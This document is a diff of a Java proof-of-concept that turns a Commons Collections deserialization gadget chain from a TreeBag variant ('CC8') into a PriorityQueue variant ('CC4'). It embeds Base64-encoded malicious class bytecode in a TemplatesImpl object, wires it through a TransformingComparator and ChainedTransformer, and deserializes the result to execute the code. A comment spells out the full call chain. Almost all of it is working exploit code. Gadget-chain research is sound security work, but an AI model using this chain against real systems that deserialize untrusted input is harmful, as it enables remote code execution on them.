@@ -1,46 +1,43 @@
-package org.example;
+package org.example.CC;
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import org.apache.commons.collections4.Transformer;
-import org.apache.commons.collections4.bag.TreeBag;
-import org.apache.commons.collections4.comparators.TransformingComparator;
 import org.apache.commons.collections4.functors.ChainedTransformer;
 import org.apache.commons.collections4.functors.ConstantTransformer;
 import org.apache.commons.collections4.functors.InstantiateTransformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
 
 import javax.xml.transform.Templates;
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.ObjectInputStream;
-import java.io.ObjectOutputStream;
+import java.io.*;
 import java.lang.reflect.Field;
 import java.util.Base64;
+import java.util.PriorityQueue;
 
 /*
-* TreeBag.readObject()
-*  ->AbstractMapBag.doReadObject()
-*   ->TreeMap.put()
-*    ->TransformingComparator.compare()
-*     ->ChainTransformer.transform()
-*      ->InstantiateTransformer.transform()
-*       ->TrAXFilter.TrAXFilter()
-*        ->TemplatesImpl.newTransformer()
-*         ->TemplatesImpl.getTransletInstance()
-*          ->TemplatesImpl.defineTransletClasses()
-*           ->TemplatesImpl$TransletClassLoader.defineClass()
+* PriorityQueue.readObject()
+*  ->PriorityQueue.heapify()
+*   ->PriorityQueue.siftDown()
+*    ->PriorityQueue.siftDownUsingComparator()
+*     ->TransformingComparator.compare()
+*      ->ChainedTransformer.transform()
+*       ->InstantiateTransformer.transform()
+*        ->TrAXFilter.TrAXFilter()
+*         ->TemplatesImpl.newTransformer()
+*          ->TemplatesImpl.getTransletInstance()
+*           ->TemplatesImpl.defineTransletClasses()
+*            ->TemplatesImpl$TransletClassLoader.defineClass()
 * */
 
-public class CC8 {
+public class CC4 {
     public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
         Field field = obj.getClass().getDeclaredField(fieldName);
         field.setAccessible(true);
         field.set(obj, value);
     }
 
-    public static void main(String[] args) throws Exception{
-        ChainedTransformer transformerChain = new ChainedTransformer(new ConstantTransformer("3xsh0re"));
+    public static void main(String[] args) throws Exception {
         byte[] CalcCode = Base64.getDecoder().decode(
                 "yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEA" +
                         "CXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RP" +
@@ -66,14 +63,15 @@ public class CC8 {
                 new ConstantTransformer(TrAXFilter.class),
                 new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{calcTemp})
         };
-        TreeBag treeBag = new TreeBag<>(new TransformingComparator(transformerChain));
-        treeBag.add("3xsh0re");
-        setFieldValue(transformerChain,"iTransformers",transformers);
+        ChainedTransformer transformerChain = new ChainedTransformer(transformers);
+        PriorityQueue<Object> queue = new PriorityQueue<>(2,new TransformingComparator(transformerChain));
+        queue.add("3xsh0re");
+        queue.add("CC-4");
 
         // 测试
         ByteArrayOutputStream barr = new ByteArrayOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(barr);
-        oos.writeObject(treeBag);
+        oos.writeObject(queue);
         oos.close();
         ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
         ois.readObject();
